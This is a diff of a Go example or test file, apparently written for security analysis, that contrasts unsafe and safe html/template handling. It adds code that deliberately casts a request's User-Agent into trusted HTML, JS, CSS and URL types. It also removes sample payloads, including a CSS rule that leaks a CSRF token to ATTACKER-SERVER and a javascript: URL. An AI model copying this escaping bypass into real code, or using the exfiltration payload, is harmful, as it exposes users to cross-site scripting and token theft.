@@ -2,13 +2,12 @@ package main
 
 import (
 	"html/template"
+	"net/http"
 	"os"
 )
 
 func main() {}
-func source(s string) string {
-	return s
-}
+
 func checkError(err error) {
 	if err != nil {
 		panic(err)
@@ -18,7 +17,7 @@ func checkError(err error) {
 type HTMLAlias = template.HTML
 
 // bad is an example of a bad implementation
-func bad() {
+func bad(req *http.Request) {
 	tmpl, _ := template.New("test").Parse(`Hi {{.}}\n`)
 	tmplTag, _ := template.New("test").Parse(`Hi <b {{.}}></b>\n`)
 	tmplScript, _ := template.New("test").Parse(`<script> eval({{.}}) </script>`)
@@ -26,53 +25,53 @@ func bad() {
 
 	{
 		{
-			var a = template.HTML(source(`<a href='example.com'>link</a>`))
+			var a = template.HTML(req.UserAgent())
 			checkError(tmpl.Execute(os.Stdout, a))
 		}
 		{
 			{
 				var a template.HTML
-				a = template.HTML(source(`<a href='example.com'>link</a>`))
+				a = template.HTML(req.UserAgent())
 				checkError(tmpl.Execute(os.Stdout, a))
 			}
 			{
 				var a HTMLAlias
-				a = HTMLAlias(source(`<a href='example.com'>link</a>`))
+				a = HTMLAlias(req.UserAgent())
 				checkError(tmpl.Execute(os.Stdout, a))
 			}
 		}
 	}
 	{
-		var c = template.HTMLAttr(source(`href="https://example.com"`))
+		var c = template.HTMLAttr(req.UserAgent())
 		checkError(tmplTag.Execute(os.Stdout, c))
 	}
 	{
-		var d = template.JS(source("alert({hello: 'world'})"))
+		var d = template.JS(req.UserAgent())
 		checkError(tmplScript.Execute(os.Stdout, d))
 	}
 	{
-		var e = template.JSStr(source("setTimeout('alert()')"))
+		var e = template.JSStr(req.UserAgent())
 		checkError(tmplScript.Execute(os.Stdout, e))
 	}
 	{
-		var b = template.CSS(source("input[name='csrftoken'][value^='b'] { background: url(//ATTACKER-SERVER/leak/b); } "))
+		var b = template.CSS(req.UserAgent())
 		checkError(tmpl.Execute(os.Stdout, b))
 	}
 	{
-		var f = template.Srcset(source(`evil.jpg 320w`))
+		var f = template.Srcset(req.UserAgent())
 		checkError(tmplSrcset.Execute(os.Stdout, f))
 	}
 	{
-		var g = template.URL(source("javascript:alert(1)"))
+		var g = template.URL(req.UserAgent())
 		checkError(tmpl.Execute(os.Stdout, g))
 	}
 }
 
 // good is an example of a good implementation
-func good() {
+func good(req *http.Request) {
 	tmpl, _ := template.New("test").Parse(`Hello, {{.}}\n`)
 	{ // This will be escaped:
-		var caught = source(`<a href="example.com">link</a>`)
+		var caught = req.UserAgent()
 		checkError(tmpl.Execute(os.Stdout, caught))
 	}
 }
